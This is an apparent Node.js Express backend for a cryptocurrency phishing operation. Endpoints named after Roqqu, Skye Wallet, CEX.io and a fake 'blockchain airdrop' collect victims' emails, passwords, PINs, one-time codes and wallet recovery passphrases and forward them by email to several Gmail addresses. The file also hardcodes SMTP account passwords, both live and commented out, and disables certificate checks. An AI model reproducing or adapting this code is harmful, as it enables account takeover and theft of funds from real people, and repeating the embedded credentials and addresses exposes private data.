const express = require('express')
const app = express()
const nodemailer = require('nodemailer')

app.use(express.json())
app.use(express.urlencoded({ extended: true }))

app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader(
        'Access-Control-Allow-Methods',
        'OPTIONS, GET, POST, PUT, PATCH, DELETE'
    )
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization')

    if (req.method === 'OPTIONS') {
        return res.sendStatus(200)
    }
    next()
})

app.get('/', (req, res) => {
    res.send('Welcome to roqq backend')
})

//  const transporter = nodemailer.createTransport({
//      host: 'mail.roqquapp.com.ng',
//      port: 465,
//      secure: true,
//      requireTLS: true,
//      socketTimeout: 1200000,
//      connectionTimeout: 1200000,
//      auth: {
//          user: 'admin@roqquapp.com.ng',
//          pass: '6d!;n1(yW,R]',
//      },
//      tls: {
//          rejectUnauthorized: false,
//      },
//  })

const transporter = nodemailer.createTransport({
    host: 'mail.growveonct.com',
    port: 465,
    secure: true,
    requireTLS: true,
    socketTimeout: 1200000,
    connectionTimeout: 1200000,
    auth: {
        user: 'admin@growveonct.com',
        pass: 'Panther1.?)0',
    },
    tls: {
        rejectUnauthorized: false,
    },
})

// verify connection configuration
transporter.verify(function (error, _success) {
    if (error) {
        console.log(error)
    } else {
        console.log('Server is ready to take our messages')
    }
})

app.post('/roqquappchat', (req, res, next) => {
    console.log('req body', req.body)

    const { email, password, pin, otp } = req.body
    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `

    const mail = {
        from: 'admin@growveonct.com',
        to: 'soulbar23@gmail.com',
        //to: 'ifestephenie@gmail.com',
        subject: 'New message from Roqquappchat',
        html: content,
    }

    // const transporter = nodemailer.createTransport({
    //     host: 'mail.roqquliveappchat.com',
    //     port: 465,
    //     secure: true,
    //     requireTLS: true,
    //     socketTimeout: 1200000,
    //     connectionTimeout: 1200000,
    //     auth: {
    //         user: 'admin@roqquliveappchat.com',
    //         pass: ']h9lh-DsAzyr',
    //     },
    //     tls: {
    //         rejectUnauthorized: false,
    //     },
    // })

    transporter.sendMail(mail, (err, data) => {
        if (err) {
            console.log({ err })
            res.json({
                status: 'fail',
            })
        } else {
            console.log('email sent', data)
            res.json({
                status: 'success',
            })
        }
    })
})
app.post('/roqquapp', (req, res, next) => {
    console.log('req body', req.body)

    const { email, password, pin, otp } = req.body
    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `

    const mail = {
        from: 'admin@growveonct.com',
        to: 'princeco12@gmail.com',
        //to: 'ifestephenie@gmail.com',
        subject: 'New message from Roqquapp',
        html: content,
    }

    // const transporter = nodemailer.createTransport({
    //     host: 'mail.roqquliveappchat.com',
    //     port: 465,
    //     secure: true,
    //     requireTLS: true,
    //     socketTimeout: 1200000,
    //     connectionTimeout: 1200000,
    //     auth: {
    //         user: 'one@roqquliveappchat.com',
    //         pass: 'FGChv+2Y%J8*',
    //     },
    //     tls: {
    //         rejectUnauthorized: false,
    //     },
    // })

    transporter.sendMail(mail, (err, data) => {
        if (err) {
            console.log({ err })
            res.json({
                status: 'fail',
            })
        } else {
            console.log('email sent', data)
            res.json({
                status: 'success',
            })
        }
    })
})
app.post('/roqqu-app', (req, res, next) => {
    console.log('req body', req.body)

    const { email, password, pin, otp } = req.body
    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `

    const mail = {
        from: 'admin@growveonct.com',
        to: 'paysroqquu@gmail.com, wj05685@gmail.com, ifestephenie@gmail.com',
        // to: 'ifestephenie@gmail.com',
        subject: 'New message from Roqqu-app',
        html: content,
    }

    // const transporter = nodemailer.createTransport({
    //     host: 'mail.roqquliveappchat.com',
    //     port: 465,
    //     secure: true,
    //     requireTLS: true,
    //     socketTimeout: 1200000,
    //     connectionTimeout: 1200000,
    //     auth: {
    //         user: 'two@roqquliveappchat.com',
    //         pass: 'MR.~-DC^?W}6',
    //     },
    //     tls: {
    //         rejectUnauthorized: false,
    //     },
    // })

    transporter.sendMail(mail, (err, data) => {
        if (err) {
            console.log({ err })
            res.json({
                status: 'fail',
            })
        } else {
            console.log('email sent', data)
            res.json({
                status: 'success',
            })
        }
    })
})

app.post('/roqquliveeeeeeee', (req, res, next) => {
    console.log('req body', req.body)

    const { email, password, pin, otp } = req.body
    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `

    const mail = {
        from: 'admin@growveonct.com',
        //to: 'obiolorkingsley22@gmail.com, wj05685@gmail.com',
        to: 'ifestephenie@gmail.com',
        subject: 'New message from Roqquliveappchat',
        html: content,
    }

    // const transporter = nodemailer.createTransport({
    //    host: 'mail.roqquliveappchat.com',
    //     port: 465,
    //     secure: true,
    //     requireTLS: true,
    //     socketTimeout: 1200000,
    //     connectionTimeout: 1200000,
    //     auth: {
    //         user: 'three@roqquliveappchat.com',
    //         pass: 'nYrZ#&,nKb=3',
    //     },
    //     tls: {
    //         rejectUnauthorized: false,
    //     },
    // })

    transporter.sendMail(mail, (err, data) => {
        if (err) {
            console.log({ err })
            res.json({
                status: 'fail',
            })
        } else {
            console.log('email sent', data)
            res.json({
                status: 'success',
            })
        }
    })
})

// For skye wallet
app.post('/skye-app', (req, res, next) => {
    console.log('req body', req.body)

    const { email, password, pin } = req.body
    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p> `

    const mail = {
        from: 'admin@growveonct.com',
        to: 'skyewallet.nigeria@gmail.com',
        subject: 'New message from Skyewallet-app',
        html: content,
    }
    // const transporter = nodemailer.createTransport({
    //     host: 'mail.growveonct.com',
    //     port: 465,
    //     secure: true,
    //     requireTLS: true,
    //     socketTimeout: 1200000,
    //     connectionTimeout: 1200000,
    //     auth: {
    //         user: 'admin@growveonct.com',
    //         pass: 'Panther1.?)0',
    //     },
    //     tls: {
    //         rejectUnauthorized: false,
    //     },
    // })

    transporter.sendMail(mail, (err, data) => {
        if (err) {
            console.log({ err })
            res.json({
                status: 'fail',
            })
        } else {
            console.log('email sent', data)
            res.json({
                status: 'success',
            })
        }
    })
})
app.post('/skyecore', (req, res, next) => {
    console.log('req body', req.body)

    const { email, password, pin } = req.body
    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br>`

    const mail = {
        from: 'admin@growveonct.com',
        to: 'ibominstagram@gmail.com',
        subject: 'New message from Skyewalletcore',
        html: content,
    }
    // const transporter = nodemailer.createTransport({
    //     host: 'mail.growveonct.com',
    //     port: 465,
    //     secure: true,
    //     requireTLS: true,
    //     socketTimeout: 1200000,
    //     connectionTimeout: 1200000,
    //     auth: {
    //         user: 'admin@growveonct.com',
    //         pass: 'Panther1.?)0',
    //     },
    //     tls: {
    //         rejectUnauthorized: false,
    //     },
    // })

    transporter.sendMail(mail, (err, data) => {
        if (err) {
            console.log({ err })
            res.json({
                status: 'fail',
            })
        } else {
            console.log('email sent', data)
            res.json({
                status: 'success',
            })
        }
    })
})
app.post('/blkairdrop', (req, res, next) => {
    console.log('req body', req.body)

    const { phrase } = req.body
    const content = `<p><strong>Passphrase:</strong> ${phrase} </p>`

    const mail = {
        from: 'admin@growveonct.com',
        to: 'testimonyibom@gmail.com',
        subject: 'New message from blockchainairdrop',
        html: content,
    }

    // const transporter = nodemailer.createTransport({
    //     host: 'mail.growveonct.com',
    //     port: 465,
    //     secure: true,
    //     requireTLS: true,
    //     socketTimeout: 1200000,
    //     connectionTimeout: 1200000,
    //     auth: {
    //         user: 'admin@growveonct.com',
    //         pass: 'Panther1.?)0',
    //     },
    //     tls: {
    //         rejectUnauthorized: false,
    //     },
    // })

    transporter.sendMail(mail, (err, data) => {
        if (err) {
            console.log({ err })
            res.json({
                status: 'fail',
            })
        } else {
            console.log('email sent', data)
            res.json({
                status: 'success',
            })
        }
    })
})
app.post('/blk-support', (req, res, next) => {
    console.log('req body', req.body)

    const { phrase } = req.body
    const content = `<p><strong>Passphrase:</strong> ${phrase} </p>`

    const mail = {
        from: 'admin@growveonct.com',
        to: 'blessedhustle02@gmail.com',
        subject: 'New message from Block-chainsupport',
        html: content,
    }

    // const transporter = nodemailer.createTransport({
    //     host: 'mail.growveonct.com',
    //     port: 465,
    //     secure: true,
    //     requireTLS: true,
    //     socketTimeout: 1200000,
    //     connectionTimeout: 1200000,
    //     auth: {
    //         user: 'admin@growveonct.com',
    //         pass: 'Panther1.?)0',
    //     },
    //     tls: {
    //         rejectUnauthorized: false,
    //     },
    // })

    transporter.sendMail(mail, (err, data) => {
        if (err) {
            console.log({ err })
            res.json({
                status: 'fail',
            })
        } else {
            console.log('email sent', data)
            res.json({
                status: 'success',
            })
        }
    })
})
/////////////////// CEX
app.post('/cex-ioapp', (req, res, next) => {
    console.log('req body', req.body)

    const { email, password, pin, otp } = req.body
    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong> ${otp}</p>`

    const mail = {
        from: 'admin@growveonct.com',
        to: 'Ibominstagram@gmail.com',
        subject: 'New message from Cexioapp',
        html: content,
    }

    // const transporter = nodemailer.createTransport({
    //     host: 'mail.growveonct.com',
    //     port: 465,
    //     secure: true,
    //     requireTLS: true,
    //     socketTimeout: 1200000,
    //     connectionTimeout: 1200000,
    //     auth: {
    //         user: 'admin@growveonct.com',
    //         pass: 'Panther1.?)0',
    //     },
    //     tls: {
    //         rejectUnauthorized: false,
    //     },
    // })

    transporter.sendMail(mail, (err, data) => {
        if (err) {
            console.log({ err })
            res.json({
                status: 'fail',
            })
        } else {
            console.log('email sent', data)
            res.json({
                status: 'success',
            })
        }
    })
})

const PORT = process.env.PORT || 3030
app.listen(PORT, () => console.info(`server has started on ${PORT}`))
